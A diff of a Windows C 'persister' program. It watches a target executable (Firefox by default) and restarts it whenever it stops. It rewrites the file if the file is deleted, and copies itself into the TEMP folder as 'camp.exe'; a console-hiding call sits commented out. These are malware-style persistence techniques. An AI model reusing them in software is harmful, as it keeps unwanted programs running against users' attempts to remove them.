@@ -125,10 +125,6 @@ int start_process(char *name, char *environment)
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
-
-    printf("name: %s\n", name);
-
-
     passed = CreateProcess(
             NULL,   // No module name (use command line)
             name,        // Command line
@@ -141,7 +137,6 @@ int start_process(char *name, char *environment)
             &si,            // Pointer to STARTUPINFO structure
             &pi);           // Pointer to PROCESS_INFORMATION structure
 
-    //WaitForSingleObject(pi.hProcess, INFINITE);
     printf("passed: %d\n", passed);
     return passed;
 }
@@ -158,7 +153,7 @@ void self_persist(char *path)
     if(size > 0)
     {
         _dupenv_s(&temp_directory_path, NULL, "TEMP");
-        full_temp_directory_path = append(temp_directory_path, "\\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.exe");
+        full_temp_directory_path = append(temp_directory_path, "\\camp.exe");
         write_file(full_temp_directory_path, buffer, size);
         get_real_path(path, &real_path);
         full_temp_directory_path = append(full_temp_directory_path, " ");
@@ -195,72 +190,45 @@ int main(int argc, char *argv[])
     //HANDLE hWnd = GetConsoleWindow();
     //ShowWindow(hWnd, SW_HIDE);
 
+    char *buff;
+    char *path;
+
     if(argc > 1)
     {
-        char *buff;
-        char *path = argv[1];
-        size_t a = read_file(path, &buff);
-
-        if(a != 0)
-        {
-            char *environment = NULL;
-            char *complete_file_name = NULL;
-            set_environment_and_name(path, &environment, &complete_file_name);
-
-            while (1)
-            {
-                if (!process_active(complete_file_name))
-                {
-                    while (start_process(path, environment) == 0)
-                    {
-                        if (check_file(path) == 0)
-                        {
-                            Sleep(5000);
-                            write_file(path, buff, a);
-                        }
-                    Sleep(500);
-                    }
-                }
-            Sleep(1000);
-            }
-        }
+        path = argv[1];
     }
     else
     {
-
-        char *buff;
-        char *path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
-        size_t a = read_file(path, &buff);
+        path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
         self_persist(argv[0]);
+    }
+    size_t a = read_file(path, &buff);
+    if(a != 0)
+    {
+        char *environment = NULL;
+        char *complete_file_name = NULL;
+        set_environment_and_name(path, &environment, &complete_file_name);
 
-        if(a != 0)
+        while (1)
         {
-            char *environment = NULL;
-            char *complete_file_name = NULL;
-            set_environment_and_name(path, &environment, &complete_file_name);
-
-            while (1)
+            if (!process_active(complete_file_name))
             {
-                if (!process_active(complete_file_name))
+                while (start_process(path, environment) == 0)
                 {
-                    while (start_process(path, environment) == 0)
+                    if (check_file(path) == 0)
                     {
-                        if (check_file(path) == 0)
-                        {
-                            Sleep(5000);
-                            write_file(path, buff, a);
-                        }
-                        Sleep(500);
+                        Sleep(5000);
+                        write_file(path, buff, a);
                     }
+                Sleep(500);
                 }
-                Sleep(1000);
             }
+        Sleep(1000);
         }
     }
-    Sleep(5000);
     return 0;
-
-    //Hello World
 }
 
+//Problem wenn Persister von Persister Persister restartet
+//gibts nen zweiten persister
 
